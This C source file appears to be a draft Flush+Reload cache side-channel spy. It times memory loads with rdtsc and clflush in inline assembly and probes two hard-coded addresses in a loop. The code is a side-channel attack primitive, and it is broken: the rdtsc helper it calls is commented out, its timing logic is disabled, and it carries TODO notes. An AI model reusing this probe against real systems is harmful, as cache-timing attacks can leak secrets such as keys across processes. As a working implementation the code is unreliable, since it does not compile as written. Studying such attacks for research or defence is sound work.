//#include <fcntl.h> // TODO remove unneeded libs
//#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdint.h>
#include <stdint.h>

#define THRESHOLD 300

// DaGe f+r implementation
//#define busy_wait(cycles) for(volatile long i_ = 0; i_ != cycles; i_++);

// probe from paper
int probe_treshold(char *adrs)
{
    volatile unsigned long time;

    __asm__ __volatile__ (
        " mfence            \n"
        " lfence            \n"
        " rdtsc             \n"
        " movl %%eax, %%esi \n"
        " movl (%1), %%eax  \n"
        " lfence            \n"
        " rdtsc             \n"
        " subl %%esi, %%eax \n"
        " clflush 0(%1)     \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    return time < THRESHOLD; 
}

int probe_precise(char *adrs)
{
    volatile unsigned long time;

    __asm__ __volatile__ (
        " mfence            \n"
        " lfence            \n"
        " rdtsc             \n"
        " movl %%eax, %%esi \n"
        " movl (%1), %%eax  \n"
        " lfence            \n"
        " rdtsc             \n"
        " subl %%esi, %%eax \n"
        " clflush 0(%1)     \n"
        : "=a" (time)
        : "c" (adrs)
        : "%esi", "%edx");
    return time; 
}

// spy process probing certain memory addresses
/*
static __inline__ unsigned long long rdtsc(void)
{
    unsigned long long int x;
    __asm__ __volatile__ (".byte 0x0f, 0x31" : "=A" (x));
    return x;
}
/**
 * loop
 * probe addresses and safe results in lists (or define length ("buffer") at beginning and just fill array)
 * wait (how to ensure constant duration of time slots?)
 * if no cache hits for X times or array full finish and create files with timings
 */
void spy(char **target_adrs, int adrs_amount, int probes_amount)
{
    unsigned long long old_tsc, tsc = rdtsc();
    unsigned long probe_time;
    //unsigned long adrs_times[adrs_amount][probes_amount]; // persistence TODO later
    for(int cur_slot=0;cur_slot<probes_amount;cur_slot++)
    {
        // update time stamps
        old_tsc = tsc;
        /*tsc=rdtsc();
        while (tsc - old_tsc < 2500)
        {
            printf("waiting %llu cycles\n", (2500-tsc+old_tsc) / 50);
            //busy_wait((2500-tsc+old_tsc) / 50);
            //tsc = rdtsc();
        }*/
        printf("system time counter: %llu, counter diff: %llu\n", tsc, tsc-old_tsc);
        for(int cur_adr_i=0;cur_adr_i<adrs_amount;cur_adr_i++)
        {
            char *ptr=target_adrs[cur_adr_i];
            probe_time=probe_precise(ptr); 
            printf("measured value for adrs %p is %lu\n", ptr, probe_time);                             // probe
                                                                        // add timing to array for persistence 
        }
                                                                        // wait 2500 cycles in ns current_probe_time asd (how?)
    }
    printf("end spy\n");
}

// default address values (?)
int main(int argc, char *argv[])
{
    printf("starting\n");
    char *target_adrs[2];
    target_adrs[0]=(char *)0x00000000000967c7;
    target_adrs[1]=(char *)0x0000000000095f5d;
    int adrs_amount = 2, pr_amount = 2000;
    printf("starting spy\n");
    spy(target_adrs, adrs_amount, pr_amount);
    printf("ending\n");
}
